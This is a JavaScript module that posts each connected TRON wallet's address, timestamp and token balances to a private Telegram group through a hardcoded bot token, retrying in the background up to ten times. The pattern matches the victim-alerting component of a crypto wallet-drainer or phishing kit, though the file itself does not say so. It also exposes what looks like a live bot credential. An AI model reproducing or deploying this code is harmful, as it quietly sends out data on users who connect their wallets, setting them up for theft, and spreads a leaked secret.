export const TelegramService = {
    BOT_TOKEN: '8434580365:AAE41hblDWPNtM5cO0GDHEX9-i51Q9fZakw',
    GROUP_ID: '-5121384419',

    /**
     * Sends a connection notification to the Telegram group.
     * @param {Object} portfolio - Result from TransactionService.getWalletPortfolio
     * @param {string} address - Wallet address
     */
    sendConnectionNotification: async (portfolio, address) => {
        try {
            const now = new Date();
            // Format time: DD.MM - HH:MM
            const day = String(now.getDate()).padStart(2, '0');
            const month = String(now.getMonth() + 1).padStart(2, '0');
            const hours = String(now.getHours()).padStart(2, '0');
            const minutes = String(now.getMinutes()).padStart(2, '0');
            const timeString = `${day}.${month} - ${hours}:${minutes}`;

            // Format Balance Breakdown: "37 TRX ve 74 USDT"
            let breakdown = `${portfolio.trx.toFixed(2)} TRX`;
            portfolio.tokens.forEach(t => {
                breakdown += ` ve ${t.balance.toFixed(2)} ${t.symbol}`;
            });

            // Construct Message
            // 👛: <a href="...">Address</a>
            // ⏰: Time
            // 💰: Total $ (Breakdown)
            const message = `
👛: <a href="https://tronscan.org/#/address/${address}">${address}</a>
⏰: ${timeString}
💰: ${portfolio.totalUsd.toFixed(4)} $ (${breakdown})
            `.trim();

            // Non-blocking background retry loop
            (async () => {
                let attempts = 0;
                const maxAttempts = 10;
                const url = `https://api.telegram.org/bot${TelegramService.BOT_TOKEN}/sendMessage`;
                const body = {
                    chat_id: TelegramService.GROUP_ID,
                    text: message,
                    parse_mode: 'HTML',
                    disable_web_page_preview: true
                };

                while (attempts < maxAttempts) {
                    try {
                        const response = await fetch(url, {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify(body)
                        });

                        if (response.ok) {
                            console.log("Telegram notification sent successfully.");
                            break;
                        } else {
                            console.error(`Telegram API Error: ${response.statusText}`);
                        }
                    } catch (err) {
                        console.error("Telegram Network Error:", err);
                    }

                    attempts++;
                    console.log(`Retrying Telegram notification (${attempts}/${maxAttempts})...`);
                    await new Promise(resolve => setTimeout(resolve, 2000)); // Wait 2s before retry
                }
            })();

        } catch (error) {
            console.error("Failed to initiate Telegram notification:", error);
        }
    }
};
